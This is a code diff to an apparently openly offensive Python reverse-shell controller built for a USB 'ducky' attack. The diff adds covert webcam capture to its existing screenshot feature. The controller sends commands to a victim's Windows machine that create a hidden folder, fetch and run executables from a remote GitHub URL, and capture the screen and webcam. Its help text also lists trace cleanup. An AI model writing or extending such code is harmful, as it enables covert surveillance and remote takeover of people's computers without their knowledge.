@@ -19,6 +19,7 @@ if "-h" in sys.argv or "--help" in sys.argv:
     print("-p [port]\t\t--port [port]\t\tUse specified port")
     print("-i [ip:port]\t--ip [ip:port]\t\tIP address and port to connect back to")
     print("-s [ip:port]\t--ssh [ip:port]\t\tIP address and port to upload files to via SCP (SSH Server)")
+    sys.exit(0)
 
 timeout = False
 stop = False
@@ -113,8 +114,9 @@ operating_system = conn.recv(1024).decode().split("\n")[0]
 print("Operating System:      " + operating_system)
 conn.send("cd $env:userprofile/Documents; rm -r z".encode())
 conn.send("mkdir z; attrib +h z; cd z".encode())
-conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/pscp.exe\" \"$env:userprofile/Documents/z/pscp.exe\"".encode())
-conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/screenshot.ps1\" \"$env:userprofile/Documents/z/screenshot.ps1\"".encode())
+conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/pscp.exe\" \"$env:userprofile/Documents/z/pscp.exe\"".encode())
+conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/screenshot.ps1\" \"$env:userprofile/Documents/z/screenshot.ps1\"".encode())
+conn.send("df \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/CommandCam.exe\" \"$env:userprofile/Documents/z/CommandCam.exe\"".encode())
 conn.send(". .\screenshot.ps1".encode())
 conn.recv(1024)
 conn.send("cd $env:userprofile".encode())
@@ -170,7 +172,10 @@ while not stop:
             print("ducky/simpsons       N/A          Prank the victim with Bart Simpson's lock message")
             print("ducky/cleanup        N/A          Cleanup footprint, leave no traces")
             print("ducky/size           N/A          Get size of current directory")
-            print("ducky/screenshot     N/A          Take a screenshot and save in reverse_shell directory")
+            print("ducky/screenshot     N/A          Take a screenshot and save in reverse shell directory")
+            print("ducky/webcam_list    N/A          List webcam devices")
+            print("ducky/webcam_snap    N/A          Take a picture with the webcam and save in reverse shell directory")
+            print("                     [device #]   Take a picture with the specified device number")
             stdin = ""
         elif ducky_command[:4] == "quit":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -310,6 +315,17 @@ while not stop:
             commands = []
             commands.append("screenshot -screen -file \"$env:userprofile/Documents/z/image.png\" -imagetype png")
             stdin = "; ".join(commands)
+        elif ducky_command[:11] == "webcam_list":
+            commands = []
+            commands.append("& \"$env:userprofile/Documents/z/CommandCam.exe\" /devlist")
+            stdin = "; ".join(commands)
+        elif ducky_command[:11] == "webcam_snap":
+            options = [x for x in ducky_command.split(" ")[1:] if x]
+            commands = []
+            if len(options) > 0:
+                commands.append("& \"$env:userprofile/Documents/z/CommandCam.exe\" /filename \"$env:userprofile/Documents/z/image.png\" /devnum " + options[0])
+            else:
+                commands.append("& \"$env:userprofile/Documents/z/CommandCam.exe\" /filename \"$env:userprofile/Documents/z/image.png\"")
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
             stdin = ""
